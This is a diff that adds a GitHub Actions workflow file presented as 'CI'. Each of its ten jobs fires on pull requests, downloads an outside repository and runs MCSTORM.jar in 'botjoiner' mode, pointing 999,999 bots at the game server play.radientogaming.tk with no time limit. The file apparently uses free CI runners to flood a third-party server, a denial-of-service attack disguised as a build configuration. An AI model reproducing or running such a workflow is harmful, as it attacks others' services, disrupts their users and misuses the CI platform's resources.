@@ -1,0 +1,96 @@
+name: Github Actions CI
+
+on: [ pull_request ]
+
+jobs:
+    p001:
+        name: one
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+  
+            - run:   apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+
+    p002:
+        name: Two
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p003:
+        name: three
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+  
+            - run:   apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p004:
+        name: four
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p005:
+        name: five
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+  
+            - run:   apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p006:
+        name: six
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p007:
+        name: seven
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p008:
+        name: eight
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p009:
+        name: nine
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+    p010:
+        name: Ten
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v2
+ 
+
+ 
+            - run: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
